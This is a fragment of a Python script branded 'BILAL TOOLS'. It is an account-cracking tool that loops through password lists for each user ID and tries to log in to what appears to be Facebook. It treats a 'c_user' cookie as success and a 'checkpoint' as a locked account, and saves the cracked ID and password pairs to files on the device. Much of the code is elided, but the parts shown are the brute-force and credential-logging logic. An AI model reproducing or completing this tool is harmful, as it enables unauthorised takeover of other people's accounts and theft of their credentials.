...
\033[1;93m--------------------------------------------------
  ...
  \033[1;32mY0UTUB3   : MASTER TRICKER
  \033[1;32mV3RS10N   : 0.1
  \033[1;32m0WN3R     : BILLU
--------------------------------------------------
\033[1;37m[-] ASSALAM-O-ALIKUM 
\033[1;37m[-] WELLCOME TO BILAL TOOLS
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [B1L4L] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [B1L4L-OK] %s | %s'%(ids,pas))
				open('/sdcard/AB B1L4L-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [B1L4L-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/B1L4L-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [B1L4L] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [B1L4L-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [B1L4L-OK] '+ids+' | '+pas)
